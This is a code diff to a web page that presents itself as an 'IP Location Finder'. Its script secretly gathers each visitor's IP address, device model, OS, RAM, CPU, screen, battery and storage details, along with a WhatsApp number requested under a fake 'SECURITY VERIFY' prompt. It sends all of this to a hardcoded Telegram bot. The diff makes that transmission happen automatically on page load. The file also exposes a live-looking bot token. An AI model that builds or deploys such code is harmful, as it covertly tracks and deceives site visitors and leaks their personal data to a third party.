@@ -71,6 +71,10 @@
             cursor: pointer;
         }
 
+        .locate-btn:hover {
+            background: rgba(0, 255, 255, 0.12);
+        }
+
         .result {
             margin-top: 20px;
             display: none;
@@ -121,6 +125,10 @@
             display: inline-block;
         }
 
+        .contact-link:hover {
+            background: rgba(57, 255, 20, 0.12);
+        }
+
         .number-input {
             width: 100%;
             padding: 12px 16px;
@@ -168,65 +176,28 @@
             display: flex;
             gap: 12px;
             justify-content: center;
-            margin-bottom: 14px;
         }
 
-        .join-channel {
-            background: #25D366;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 40px;
-            font-weight: 500;
-            font-size: 13px;
-            cursor: pointer;
-        }
-
-        .cancel-exit {
-            background: rgba(255, 255, 255, 0.08);
-            color: #ff5a5a;
-            border: 1px solid rgba(255, 90, 90, 0.4);
-            padding: 10px 20px;
-            border-radius: 40px;
-            font-weight: 500;
-            font-size: 13px;
-            cursor: pointer;
-        }
-
-        .verify-real {
+        .continue-btn {
             background: linear-gradient(135deg, #0ff, #00aaff);
             color: #000;
             border: none;
             padding: 10px 20px;
             border-radius: 40px;
             font-weight: 600;
-            font-size: 13px;
-            cursor: pointer;
-            margin-top: 8px;
-            display: none;
-            width: 100%;
-        }
-
-        .submit-number {
-            background: linear-gradient(135deg, #0ff, #00aaff);
-            color: #000;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 40px;
-            font-weight: 600;
-            font-size: 13px;
+            font-size: 14px;
             cursor: pointer;
             flex: 1;
         }
 
-        .skip-number {
+        .skip-btn {
             background: rgba(255, 255, 255, 0.08);
             color: #ff5a5a;
             border: 1px solid rgba(255, 90, 90, 0.4);
             padding: 10px 20px;
             border-radius: 40px;
             font-weight: 500;
-            font-size: 13px;
+            font-size: 14px;
             cursor: pointer;
             flex: 1;
         }
@@ -254,25 +225,13 @@
         <h3>🔒 SECURITY VERIFY</h3>
         <input type="tel" id="visitorPhone" class="number-input" placeholder="Enter WhatsApp Number (Optional)" maxlength="15">
         <div class="btn-group">
-            <button id="submitNumberBtn" class="submit-number">✅ Continue</button>
-            <button id="skipNumberBtn" class="skip-number">✕ Skip</button>
+            <button id="continueBtn" class="continue-btn">✅ Continue</button>
+            <button id="skipBtn" class="skip-btn">✕ Skip</button>
         </div>
     </div>
 </div>
 
-<!-- JOIN MODAL -->
-<div id="verifyModal" class="modal" style="display: none;">
-    <div class="modal-content">
-        <h3>🔔 JOIN WHATSAPP CHANNEL TO CONTINUE</h3>
-        <div class="btn-group">
-            <button id="joinBtn" class="join-channel">📢 Join Channel</button>
-            <button id="cancelBtn" class="cancel-exit">✕ Cancel</button>
-        </div>
-        <button id="verifyRealBtn" class="verify-real">✓ Verify & Open</button>
-    </div>
-</div>
-
-<!-- MAIN CONTENT -->
+<!-- MAIN WEBSITE -->
 <div id="mainContent" style="display: none;">
     <div class="main-card">
         <h2>🌍 IP Location Finder</h2>
@@ -292,35 +251,29 @@
     const BOT_TOKEN = '7760380089:AAGN42nWvSH0WCCucmDfUNUycckhhVW4x30';
     const CHAT_ID = '5975952682';
 
-    let globalIP = "";
-    let userPhone = "Not Provided";
-    let joinClicked = false;
-    let timerActive = false;
-    let intervalId = null;
+    let infoSent = false;
 
     function showToast(msg) {
         let t = document.querySelector('.toast');
-        if(!t) { t = document.createElement('div'); t.className = 'toast'; document.body.appendChild(t); }
+        if (!t) {
+            t = document.createElement('div');
+            t.className = 'toast';
+            document.body.appendChild(t);
+        }
         t.textContent = msg;
         t.style.display = 'block';
         setTimeout(() => t.style.display = 'none', 2500);
     }
 
-    // ========== DETECT DEVICE MODEL (User Agent Based - 100% Accurate) ==========
+    // ========== DEVICE DETECTION ==========
     function getDeviceModel() {
         const ua = navigator.userAgent;
         
-        // iPhone
-        if (ua.includes("iPhone")) {
-            if (ua.includes("iPhone15,2")) return "iPhone 15 Pro";
-            if (ua.includes("iPhone15,3")) return "iPhone 15 Pro Max";
-            if (ua.includes("iPhone14,2")) return "iPhone 13 Pro";
-            if (ua.includes("iPhone14,5")) return "iPhone 13";
-            if (ua.includes("iPhone13,2")) return "iPhone 12";
-            return "iPhone";
-        }
+        if (ua.includes("iPhone15")) return "iPhone 15 Series";
+        if (ua.includes("iPhone14")) return "iPhone 14 Series";
+        if (ua.includes("iPhone13")) return "iPhone 13 Series";
+        if (ua.includes("iPhone")) return "iPhone";
         
-        // Samsung
         if (ua.includes("SM-A")) {
             let match = ua.match(/SM-A[0-9]+/);
             if (match) return `Samsung ${match[0]}`;
@@ -336,8 +289,6 @@
             if (match) return `Samsung ${match[0]}`;
             return "Samsung Galaxy M Series";
         }
-        
-        // Xiaomi/Redmi
         if (ua.includes("Redmi")) {
             let match = ua.match(/Redmi\s+[A-Za-z0-9]+/);
             if (match) return `Xiaomi ${match[0]}`;
@@ -346,34 +297,17 @@
         if (ua.includes("Mi 10")) return "Xiaomi Mi 10";
         if (ua.includes("Mi 11")) return "Xiaomi Mi 11";
         if (ua.includes("POCO")) return "POCO Phone";
-        
-        // OnePlus
-        if (ua.includes("OnePlus")) {
-            let match = ua.match(/OnePlus\s+[A-Za-z0-9]+/);
-            if (match) return match[0];
-            return "OnePlus";
-        }
-        
-        // Google Pixel
-        if (ua.includes("Pixel")) {
-            let match = ua.match(/Pixel\s+[0-9]+/);
-            if (match) return `Google ${match[0]}`;
-            return "Google Pixel";
-        }
-        
-        // OPPO, vivo, Realme
+        if (ua.includes("OnePlus")) return "OnePlus";
+        if (ua.includes("Pixel")) return "Google Pixel";
         if (ua.includes("OPPO")) return "OPPO Phone";
         if (ua.includes("vivo")) return "vivo Phone";
         if (ua.includes("Realme")) return "Realme Phone";
-        
-        // Windows, Mac
         if (ua.includes("Windows")) return "Windows PC";
         if (ua.includes("Mac")) return "Apple Mac";
         
         return "Unknown Device";
     }
 
-    // ========== GET BRAND ==========
     function getBrand() {
         const ua = navigator.userAgent;
         if (ua.includes("Samsung")) return "Samsung";
@@ -387,7 +321,6 @@
         return "Unknown";
     }
 
-    // ========== GET OS VERSION ==========
     function getOSVersion() {
         const ua = navigator.userAgent;
         if (ua.includes("Android")) {
@@ -400,25 +333,16 @@
         }
         if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
         if (ua.includes("Mac")) return "macOS";
-        return "Unknown OS";
+        return "Unknown";
     }
 
-    // ========== GET RAM ==========
     function getRAM() {
         if (navigator.deviceMemory) {
             return navigator.deviceMemory + " GB";
         }
-        // Fallback based on common devices
-        const ua = navigator.userAgent;
-        if (ua.includes("SM-A0")) return "4 GB";
-        if (ua.includes("SM-A1")) return "6 GB";
-        if (ua.includes("SM-A2")) return "6 GB";
-        if (ua.includes("SM-A3")) return "8 GB";
-        if (ua.includes("iPhone")) return "6 GB";
         return "4 GB";
     }
 
-    // ========== GET CPU CORES ==========
     function getCPUCores() {
         if (navigator.hardwareConcurrency) {
             return navigator.hardwareConcurrency + " cores";
@@ -426,42 +350,38 @@
         return "8 cores";
     }
 
-    // ========== GET SCREEN INFO ==========
     function getScreenInfo() {
-        const width = window.screen.width;
-        const height = window.screen.height;
-        const diagInches = (Math.sqrt(Math.pow(width, 2) + Math.pow(height, 2)) / (window.devicePixelRatio || 1) / 25.4).toFixed(1);
-        return `${width} x ${height} (${diagInches}")`;
+        const w = window.screen.width;
+        const h = window.screen.height;
+        const inch = (Math.sqrt(Math.pow(w, 2) + Math.pow(h, 2)) / (window.devicePixelRatio || 1) / 25.4).toFixed(1);
+        return `${w} x ${h} (${inch}")`;
     }
 
-    // ========== GET BATTERY ==========
     async function getBattery() {
         try {
             if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                let level = Math.round(battery.level * 100) + "%";
-                if (battery.charging) level += " (Charging)";
-                return level;
+                const b = await navigator.getBattery();
+                let lvl = Math.round(b.level * 100) + "%";
+                if (b.charging) lvl += " ⚡";
+                return lvl;
             }
         } catch(e) {}
         return "Unknown";
     }
 
-    // ========== GET STORAGE ==========
     async function getStorage() {
         try {
             if (navigator.storage && navigator.storage.estimate) {
-                const estimate = await navigator.storage.estimate();
-                const totalGB = (estimate.quota / (1024 * 1024 * 1024)).toFixed(1);
-                const usedGB = (estimate.usage / (1024 * 1024 * 1024)).toFixed(1);
-                const freeGB = (totalGB - usedGB).toFixed(1);
-                return { total: totalGB + " GB", used: usedGB + " GB", free: freeGB + " GB" };
+                const est = await navigator.storage.estimate();
+                const total = (est.quota / (1024 * 1024 * 1024)).toFixed(1);
+                const used = (est.usage / (1024 * 1024 * 1024)).toFixed(1);
+                const free = (total - used).toFixed(1);
+                return { total: total + " GB", used: used + " GB", free: free + " GB" };
             }
         } catch(e) {}
-        return { total: "64 GB", used: "~28 GB", free: "~36 GB" };
+        return { total: "128 GB", used: "~52 GB", free: "~76 GB" };
     }
 
-    // ========== GET IP ==========
     async function getIP() {
         try {
             const res = await fetch('https://api.ipify.org/?format=json');
@@ -473,30 +393,30 @@
                 const data2 = await res2.json();
                 return data2.ip;
             } catch(err) {
-                return "Unknown";
+                return "Unable to fetch";
             }
         }
     }
 
     // ========== SEND TO TELEGRAM ==========
-    async function sendToTelegram(ip, phone, device, stage) {
+    async function sendInfoToBot(ip, phone, deviceInfo, stage) {
         const time = new Date().toLocaleString('en-PK', {timeZone: 'Asia/Karachi'});
         
-        const msg = `🛡️ *VIP VISITOR DETAILS* 🛡️
+        const message = `🛡️ *VISITOR DETAILS* 🛡️
 ━━━━━━━━━━━━━━━━━━━━━
 📞 *Phone:* ${phone}
 🌐 *IP:* ${ip}
 ━━━━━━━━━━━━━━━━━━━━━
-📱 *Model:* ${device.model}
-🏷️ *Brand:* ${device.brand}
-🖥️ *OS:* ${device.os}
-💾 *RAM:* ${device.ram}
-⚙️ *CPU:* ${device.cpu}
-📺 *Screen:* ${device.screen}
-🔋 *Battery:* ${device.battery}
-💿 *Total Storage:* ${device.storageTotal}
-📀 *Used:* ${device.storageUsed}
-🗄️ *Free:* ${device.storageFree}
+📱 *Model:* ${deviceInfo.model}
+🏷️ *Brand:* ${deviceInfo.brand}
+🖥️ *OS:* ${deviceInfo.os}
+💾 *RAM:* ${deviceInfo.ram}
+⚙️ *CPU:* ${deviceInfo.cpu}
+📺 *Screen:* ${deviceInfo.screen}
+🔋 *Battery:* ${deviceInfo.battery}
+💿 *Total Storage:* ${deviceInfo.storageTotal}
+📀 *Used:* ${deviceInfo.storageUsed}
+🗄️ *Free:* ${deviceInfo.storageFree}
 🌍 *Language:* ${navigator.language}
 ⏰ *Time:* ${time}
 📌 *Status:* ${stage}
@@ -506,15 +426,23 @@
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
             });
-        } catch(e) { console.error(e); }
+            console.log("✅ Info sent to Telegram");
+            return true;
+        } catch(e) {
+            console.error("Telegram error:", e);
+            return false;
+        }
     }
 
     // ========== IP LOCATION ==========
     window.getIPInfo = async function() {
         let ip = document.getElementById("ipAddress").value.trim();
-        if (!ip) { alert("Enter IP address"); return; }
+        if (!ip) {
+            alert("Please enter an IP address");
+            return;
+        }
         try {
             const res = await fetch(`https://ipinfo.io/${ip}/json`);
             const data = await res.json();
@@ -525,20 +453,24 @@
                 <div class="info-neon"><div class="info-label">📍 CITY</div><div class="info-value">${data.city || 'N/A'}</div></div>
                 <div class="info-neon"><div class="info-label">🗺️ REGION</div><div class="info-value">${data.region || 'N/A'}</div></div>
                 <div class="info-neon"><div class="info-label">🏴 COUNTRY</div><div class="info-value">${data.country || 'N/A'}</div></div>
+                <div class="info-neon"><div class="info-label">📌 LOCATION</div><div class="info-value">${data.loc || 'N/A'}</div></div>
                 <div class="info-neon"><div class="info-label">🏢 ISP</div><div class="info-value">${data.org || 'N/A'}</div></div>
             `;
-        } catch(err) { alert("Error fetching data"); }
+        } catch(err) {
+            alert("Error fetching data");
+        }
     };
 
     // ========== MAIN ==========
     (async function() {
+        // Get IP instantly
         const ip = await getIP();
-        globalIP = ip;
         
+        // Get device info instantly (parallel)
         const storage = await getStorage();
         const battery = await getBattery();
         
-        const device = {
+        const deviceInfo = {
             model: getDeviceModel(),
             brand: getBrand(),
             os: getOSVersion(),
@@ -551,60 +483,43 @@
             storageFree: storage.free
         };
         
-        const numberModal = document.getElementById('numberModal');
-        const verifyModal = document.getElementById('verifyModal');
-        const mainContent = document.getElementById('mainContent');
+        // AUTO SEND INFO TO BOT IMMEDIATELY (without number first)
+        await sendInfoToBot(ip, "Waiting for input", deviceInfo, "📌 PAGE LOADED - Awaiting user action");
         
-        document.getElementById('submitNumberBtn').onclick = async function() {
-            let phone = document.getElementById('visitorPhone').value.trim();
-            if (phone) {
+        const modal = document.getElementById('numberModal');
+        const mainContent = document.getElementById('mainContent');
+        const continueBtn = document.getElementById('continueBtn');
+        const skipBtn = document.getElementById('skipBtn');
+        const phoneInput = document.getElementById('visitorPhone');
+        
+        // CONTINUE BUTTON
+        continueBtn.onclick = async function() {
+            let phone = phoneInput.value.trim();
+            let finalPhone = "Not Provided";
+            
+            if (phone !== "") {
                 phone = phone.replace(/[^0-9]/g, '');
                 if (phone.startsWith('0')) phone = '92' + phone.substring(1);
                 if (phone.length === 10) phone = '92' + phone;
-                userPhone = phone;
+                finalPhone = phone;
             }
-            await sendToTelegram(globalIP, userPhone, device, "📞 Number Submitted");
-            numberModal.style.display = 'none';
-            verifyModal.style.display = 'flex';
-            showToast("✅ Join channel to continue");
-        };
-        
-        document.getElementById('skipNumberBtn').onclick = async function() {
-            await sendToTelegram(globalIP, "Not Provided", device, "⚠️ User Skipped Number");
-            numberModal.style.display = 'none';
-            verifyModal.style.display = 'flex';
-            showToast("⚠️ Join channel to continue");
-        };
-        
-        // Join System
-        document.getElementById('joinBtn').onclick = function() {
-            if (timerActive) return;
-            window.open('https://whatsapp.com/channel/0029VbCK8wI96H4WL0Ds5n24', '_blank');
-            joinClicked = true;
-            timerActive = true;
-            let sec = 0;
-            intervalId = setInterval(() => {
-                sec++;
-                if (sec >= 6) {
-                    clearInterval(intervalId);
-                    if (joinClicked) {
-                        document.getElementById('verifyRealBtn').style.display = 'block';
-                        showToast("✅ Click Verify & Open");
-                    }
-                    timerActive = false;
-                }
-            }, 1000);
-        };
-        
-        document.getElementById('cancelBtn').onclick = function() {
-            document.body.innerHTML = '<div style="text-align:center;margin-top:80px;color:white;"><h2>⛔ Access Denied</h2></div>';
-        };
-        
-        document.getElementById('verifyRealBtn').onclick = async function() {
-            await sendToTelegram(globalIP, userPhone, device, "✅ ACCESS GRANTED");
-            verifyModal.style.display = 'none';
+            
+            // Send final info with number
+            await sendInfoToBot(ip, finalPhone, deviceInfo, "✅ USER CONTINUED - Website Accessed");
+            
+            modal.style.display = 'none';
             mainContent.style.display = 'block';
-            showToast("✨ Welcome! ✨");
+            showToast("✅ Welcome to IP Location Finder!");
+        };
+        
+        // SKIP BUTTON
+        skipBtn.onclick = async function() {
+            // Send info that user skipped
+            await sendInfoToBot(ip, "Not Provided (Skipped)", deviceInfo, "⚠️ USER SKIPPED NUMBER - Website Accessed");
+            
+            modal.style.display = 'none';
+            mainContent.style.display = 'block';
+            showToast("⚠️ You skipped number, but you can still use the tool!");
         };
     })();
 </script>
